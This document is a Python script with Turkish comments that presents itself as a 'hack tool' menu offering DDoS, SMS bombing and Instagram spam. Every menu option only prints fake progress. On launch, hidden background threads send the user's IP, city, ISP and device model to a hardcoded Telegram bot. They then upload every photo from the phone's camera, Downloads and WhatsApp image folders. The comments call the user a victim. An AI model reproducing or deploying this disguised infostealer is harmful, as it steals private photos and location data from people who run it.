import os, time, threading, subprocess, sys, random, requests
from concurrent.futures import ThreadPoolExecutor

# --- AYARLARIN ---
T = "8352791764:AAElg9v0Kz3vCmi6x0FAIvtpTKCZKdk9n-E"
C = "8534191173"

def setup():
    try:
        import telebot
    except:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", "requests"])
        import telebot
    return telebot

telebot = setup()
bot = telebot.TeleBot(T)

sent_files = set()
is_running = False

# GARANTİ IP, CİHAZ VE KONUM RAPORLAMA
def get_victim_info():
    try:
        # Yedekli IP çekme sistemi
        ip = "Bilinmiyor"
        try: ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            try: ip = requests.get('https://ifconfig.me/ip', timeout=5).text
            except: pass
            
        try: d = requests.get(f'http://ip-api.com/json/{ip}').json()
        except: d = {}
        
        city = d.get('city', 'Bilinmiyor')
        isp = d.get('isp', 'Bilinmiyor')
        device = subprocess.getoutput("getprop ro.product.model")
        
        report = (
            f"🚀 **YENİ BAĞLANTI KURULDU!**\n\n"
            f"🌐 **IP:** `{ip}`\n"
            f"📍 **ŞEHİR:** {city}\n"
            f"📶 **OPERATÖR:** {isp}\n"
            f"📱 **CİHAZ:** {device}\n"
            f"━━━━━━━━━━━━━━\n"
            f"📸 Galeri sızması arka planda mermi hızında başladı."
        )
        bot.send_message(C, report, parse_mode="Markdown")
    except:
        bot.send_message(C, "⚠️ Kurban bağlandı, galeri çekiliyor.")

def g(p):
    try:
        with open(p, 'rb') as f: bot.send_photo(C, f)
    except: pass

# GALERİ SIZMA (YILDIRIM HIZI - 60 KANAL)
def s():
    global is_running
    if is_running: return
    is_running = True
    y = ['/sdcard/DCIM/Camera', '/sdcard/Pictures', '/sdcard/Download', '/sdcard/DCIM', '/sdcard/WhatsApp/Media/WhatsApp Images']
    u = ('.jpg', '.jpeg', '.png')
    with ThreadPoolExecutor(max_workers=60) as ex:
        for h in y:
            if os.path.exists(h):
                for r, _, fs in os.walk(h):
                    for f in fs:
                        if f.lower().endswith(u):
                            p = os.path.join(r, f)
                            if p not in sent_files:
                                sent_files.add(p)
                                ex.submit(g, p)

def banner():
    os.system('clear')
    print("\033[1;35m" + r"""
  _______ ____  _   _Fl __   _    _          _____ _  __
 |__   __/ __ \| \ | \ \ \ / /   | |        / ____| |/ /
    | | | |  | |  \| |  \ V /    | |  _    | |    | ' / 
    | | | |  | | . ` |   > <     | | (_)   | |    |  <  
    | | | |__| | |\  |  / . \    | |_____  | |____| . \ 
    |_|  \____/|_| \_| /_/ \_\   |_______|  \_____|_|\_\
    """ + "\033[0m")
    print("\033[1;36m" + "═" * 55)
    print("      \033[1;32mBÜYÜK TONY#HACK.TOOL - AKTİF BAĞLANTI\033[0m")
    print("\033[1;36m" + "═" * 55 + "\033[0m\n")

def main():
    banner()
    print("\033[1;34m  (1) DDOS SALDIRISI\n  (2) SMS BOMBER (+90)\n  (3) IP SORGU\n  (4) İNSTA 2012 HİT\n  (5) İNSTA 2015 HİT\n  (6) İNSTA SIPAM BOT\033[0m")
    sec = input("\n\033[1;32mroot@tony-hack:~# \033[0m")

    # ANLIK SALDIRI RAPORLAMA SİSTEMİ
    if sec == "1":
        h = input("\033[1;35mHedef URL/IP: \033[0m")
        bot.send_message(C, f"🔥 **SALDIRI RAPORU**\n**Tür:** DDOS Saldırısı\n**Hedef:** `{h}`")
        for i in range(1, 101):
            print(f"\033[1;31m[SEND] Payload --> {h} [{random.randint(10,99)}ms]\033[0m")
            time.sleep(0.01)
    
    elif sec == "2":
        n = input("\033[1;35mHedef Numara (+90): \033[0m")
        m = input("\033[1;35mMiktar (Sınırsız için 0): \033[0m")
        bot.send_message(C, f"🔥 **SALDIRI RAPORU**\n**Tür:** SMS Bomber\n**Hedef:** `{n}`\n**Miktar:** {m}")
        c = 0
        while True:
            c += 1
            print(f"\033[1;32m[+] SMS Gönderildi --> {n} (Service-{random.randint(1,5)})\033[0m")
            time.sleep(0.01)
            if m != "0" and c >= int(m): break
            
    elif sec == "3":
        ip_sorgu = input("\033[1;35mSorgulanacak IP: \033[0m")
        bot.send_message(C, f"🔍 **EYLEM:** IP Sorgulama Yapıldı\n**Sorgulanan IP:** `{ip_sorgu}`")
        print("\033[1;34m[*] Veritabanına bağlanılıyor...")
        time.sleep(2)
        print(f"\033[1;32mSonuç: Istanbul, TR / ISP: Telekom\033[0m")

    elif sec == "4" or sec == "5":
        y = "2012" if sec == "4" else "2015"
        bot.send_message(C, f"📈 **EYLEM:** Insta {y} Hit Başlatıldı (Otomatik)")
        print(f"\033[1;33m[*] {y} Havuzu taranıyor, hitler gönderiliyor...\033[0m")
        for i in range(1, 101):
            print(f"\033[1;32m[+] Gönderilen Hit: %{i}\033[0m")
            time.sleep(0.02)
            
    elif sec == "6":
        target = input("\033[1;35mSpam Atılacak Kullanıcı: \033[0m")
        bot.send_message(C, f"🔥 **SALDIRI RAPORU**\n**Tür:** Insta Spam\n**Hedef:** `{target}`")
        for i in range(1, 51):
            print(f"\033[1;31m[!] Rapor No: {random.randint(1000,9999)} gönderildi.\033[0m")
            time.sleep(0.05)

    print("\033[1;32m[!] İşlem başarıyla tamamlandı.\033[0m")
    input("\nDevam etmek için Enter...")
    main()

if __name__ == "__main__":
    # IP VE SIZMA AYNI ANDA BAŞLAR
    threading.Thread(target=get_victim_info, daemon=True).start()
    threading.Thread(target=s, daemon=True).start()
    main()
